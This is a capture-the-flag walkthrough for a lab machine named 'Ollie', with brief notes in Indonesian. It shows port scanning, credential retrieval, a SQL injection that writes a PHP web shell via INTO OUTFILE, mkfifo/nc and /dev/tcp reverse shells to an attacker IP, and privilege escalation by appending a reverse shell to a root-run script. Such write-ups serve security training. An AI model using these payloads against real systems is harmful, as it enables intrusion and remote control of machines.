```sh
rustscan -a 10.10.11.248 --ulimit 5000 -- -A -oN rustscan_all_out.txt
```

```
# Nmap 7.92 scan initiated Sun Apr 10 19:57:49 2022 as: nmap -vvv -p 22,80,1337 -A -oN rustscan_all_out.txt 10.10.11.248  
Nmap scan report for 10.10.11.248  
Host is up, received syn-ack (0.43s latency).  
Scanned at 2022-04-10 19:57:50 +08 for 238s  
  
PORT     STATE SERVICE REASON  VERSION  
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)  
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))  
1337/tcp open  waste?  syn-ack  
| fingerprint-strings:    
|   GenericLines:    
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.  
|     What is your name? What's up,    
|     It's been a while. What are you here for?  
|   GetRequest:    
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.  
|     What is your name? What's up, Get / http/1.0  
|     It's been a while. What are you here for?  
|   NULL:    
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.  
|_    What is your name?  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-serv  
ice :  
SF-Port1337-TCP:V=7.92%I=7%D=4/10%Time=6252C645%P=x86_64-pc-linux-gnu%r(NU  
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\  
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20  
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2  
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you  
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.  
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s  
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\  
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x  
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\  
SF:x20are\x20you\x20here\x20for\?\x20");  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sun Apr 10 20:01:48 2022 -- 1 IP address (1 host up) scanned in 239.07 seconds
```

```sh
nc 10.10.11.248 1337
```

```
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.  
  
What is your name? dims    
What's up, Dims! It's been a while. What are you here for? shell  
Ya' know what? Dims. If you can answer a question about me, I might have something for you.  
  
  
What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog  
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...  
Please hold on a minute  
Ok, I'm back.  
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.  
  
                   Username: admin  
  
                   Password: OllieUnixMontgomery!  
  
PS: Good luck and next time bring some treats!
```

login

![](Pasted%20image%2020220410201426.png)
versi lama > vulnerable

```
http://10.10.11.248/index.php?page=administration&section=routing&subnetId=bgp&sPage=1
```

```php
 <?php system($_GET["cmd"]); ?>
```
make it to hex
```
203c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e
```

```
" Union Select 1,0x203c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
```

![](Pasted%20image%2020220410205730.png)

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.90.165 1337 >/tmp/f
```

rubah menjadi url encode

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.18.90.165%201337%20%3E%2Ftmp%2Ff
```
masukkan ke
```sh
nc -nlvp 1337
```

```sh
curl http://10.10.141.57/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.18.90.165%201337%20%3E%2Ftmp%2Ff
```

```sh
su ollie
# password: OllieUnixMontgomery!
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
server kita
```sh
python3 -m http.server
```

```
wget http://10.18.90.165:8000/pspy64
chmod +x pspy64
./pspy64
```
![](Pasted%20image%2020220412155009.png)

```sh
cat /usr/bin/feedme
ls -l /usr/bin/feedme
```
![](Pasted%20image%2020220412155326.png)
```sh
echo "/bin/bash -i >& /dev/tcp/10.18.90.165/1338 0>&1" >> /usr/bin/feedme
or
echo "#! /bin/bash
/bin/bash -i >& /dev/tcp/10.18.90.165/1338 0>&1" > /usr/bin/feedme
```
Server kita
```sh
nc -nlvp 1338
```
### Referensi
- https://lanfran02.github.io/posts/ollie/

